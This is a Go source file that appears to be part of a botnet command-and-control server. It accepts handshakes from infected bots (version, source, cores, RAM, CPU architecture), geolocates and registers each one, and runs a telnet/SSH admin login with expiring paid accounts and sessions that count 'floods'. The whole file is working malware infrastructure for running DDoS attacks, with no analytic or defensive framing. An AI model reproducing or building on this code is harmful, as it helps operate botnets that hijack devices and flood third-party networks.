package masters

import (
	"cnc/core/database"
	"cnc/core/masters/sessions"
	"cnc/core/slaves"
	"cnc/core/utils"
	"fmt"
	"net"
	"time"
)

func readFull(conn net.Conn, buf []byte) error {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		if err != nil {
			return err
		}
		if n == 0 {
			return fmt.Errorf("connection closed")
		}
		total += n
	}
	return nil
}


func initialHandler(conn net.Conn) {
	if conn == nil {
		fmt.Println("Error: Nil connection received")
		return
	}
	defer conn.Close() 

	
	err := conn.SetDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		fmt.Printf("Error setting deadline: %v\n", err)
		return
	}

	
	buf := make([]byte, 4)
	err = readFull(conn, buf)
	if err != nil {
		
		return
	}

	
	if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		version := buf[3]
		if version > 0 {
			stringLen := make([]byte, 1)
			if err := readFull(conn, stringLen); err != nil {
				return
			}

			var source string
			if stringLen[0] > 0 {
				sourceBuf := make([]byte, stringLen[0])
				if err := readFull(conn, sourceBuf); err != nil {
					return
				}
				source = string(sourceBuf)
			}

			
			statsBuf := make([]byte, 6)
			if err := readFull(conn, statsBuf); err != nil {
				return
			}

			cores := int(uint16(statsBuf[0])<<8 | uint16(statsBuf[1]))
			ram := int(uint32(statsBuf[2])<<24 | uint32(statsBuf[3])<<16 | uint32(statsBuf[4])<<8 | uint32(statsBuf[5]))

			var arch string = "armv6l"
			
			if version >= 2 {
				archLenBuf := make([]byte, 1)
				if err := readFull(conn, archLenBuf); err == nil {
					if archLenBuf[0] > 0 {
						archBuf := make([]byte, archLenBuf[0])
						if err := readFull(conn, archBuf); err == nil {
							arch = string(archBuf)
						}
					}
				}
			}

			if arch == "" {
				arch = "armv6l"
			}

			
			authMagic := []byte{0x4A, 0x8F, 0x2C, 0xD1}
			if _, err := conn.Write(authMagic); err != nil {
				return
			}

			
			country, isp := utils.GetIPInfo(conn.RemoteAddr().String())
			bot := slaves.NewBot(conn, version, source, arch, cores, ram, country, isp)
			bot.InitEncryption(conn.RemoteAddr().String())
			bot.Handle()
		} else {
			
			statsBuf := make([]byte, 6)
			if err := readFull(conn, statsBuf); err != nil {
				return
			}

			cores := int(uint16(statsBuf[0])<<8 | uint16(statsBuf[1]))
			ram := int(uint32(statsBuf[2])<<24 | uint32(statsBuf[3])<<16 | uint32(statsBuf[4])<<8 | uint32(statsBuf[5]))

			arch := "Unknown"
			authMagic := []byte{0x4A, 0x8F, 0x2C, 0xD1}
			if _, err := conn.Write(authMagic); err != nil {
				return
			}

			country, isp := utils.GetIPInfo(conn.RemoteAddr().String())
			bot := slaves.NewBot(conn, version, "", arch, cores, ram, country, isp)
			bot.InitEncryption(conn.RemoteAddr().String())
			bot.Handle()
		}
		return
	}

	return
}


func (a *Admin) Handle() {
	if a == nil || a.conn == nil {
		fmt.Println("Error: Invalid Admin struct or connection")
		return
	}
	defer a.conn.Close() 

	if !a.IsSSH {
		a.Printf("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22") 
		defer a.Printf("\u001B[?1049l")                  
	}

	var username string
	var password string
	var loggedIn bool
	var userInfo database.AccountInfo
	var err error

	if a.IsSSH && a.Username != "" {
		
		username = a.Username
		userInfo, err = database.DatabaseConnection.GetAccountInfo(username)
		if err != nil {
			fmt.Printf("Error getting account info for SSH user %s: %v\n", username, err)
			return
		}
		loggedIn = true
	} else {
		
		err := Displayf(a, "assets/branding/login/username.txt", "")
		if err != nil {
			fmt.Printf("Error displaying username prompt: %v\n", err)
			return
		}

		username, err = a.ReadLine("Username: ", false)
		if err != nil {
			fmt.Printf("Error reading username: %v\n", err)
			return
		}

		
		err = a.conn.SetDeadline(time.Now().Add(60 * time.Second))
		if err != nil {
			fmt.Printf("Error setting deadline: %v\n", err)
			return
		}

		
		err = Displayf(a, "assets/branding/login/password.txt", "")
		if err != nil {
			fmt.Printf("Error displaying password prompt: %v\n", err)
			return
		}

		password, err = a.ReadLine("Password: ", true)
		if err != nil {
			fmt.Printf("Error reading password: %v\n", err)
			return
		}

		
		err = a.conn.SetDeadline(time.Now().Add(120 * time.Second))
		if err != nil {
			fmt.Printf("Error setting extended deadline: %v\n", err)
			return
		}

		
		if isTimedOut(username) {
			a.Clear()
			err := Displayln(a, "./assets/branding/login/timedout.txt", username)
			if err != nil {
				fmt.Printf("Error displaying timeout message: %v\n", err)
			}
			time.Sleep(5 * time.Second)
			return
		}

		
		loggedIn, userInfo, err = database.DatabaseConnection.TryLogin(username, password, a.conn.RemoteAddr().String())
		if err != nil {
			fmt.Printf("Error during login attempt: %v\n", err)
			return
		}
		if !loggedIn {
			Displayln(a, "assets/branding/login/invalid.txt", username)
			time.Sleep(2 * time.Second)
			return
		}
	}

	
	if time.Now().After(userInfo.Expiry) {
		err := Displayln(a, "assets/branding/login/expired.txt", username)
		if err != nil {
			fmt.Printf("Error displaying expiration message: %v\n", err)
		}
		return
	}

	
	session := &sessions.Session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     a.conn,
		Account:  userInfo,
		Floods:   0,
	}

	sessions.SessionMutex.Lock()
	sessions.Sessions[session.ID] = session
	sessions.SessionMutex.Unlock()
	a.Session = session

	
	defer session.Remove()

	
	go func() {
		i := 0
		for {
			time.Sleep(time.Second)
			err := DisplayTitle(a, username)
			if err != nil {
				fmt.Printf("Error updating title: %v\n", err)
				return
			}

			i++
			if i%10 == 0 {
				err = a.conn.SetDeadline(time.Now().Add(120 * time.Second))
				if err != nil {
					fmt.Printf("[Admin - TitleInterval] Error extending deadline: %v\n", err)
					return
				}
			}
		}
	}()

	
	err = Displayln(a, "./assets/branding/user/banner.txt", a.Session.Username)
	if err != nil {
		fmt.Printf("Error displaying banner: %v\n", err)
		return
	}

	a.Commands()
}
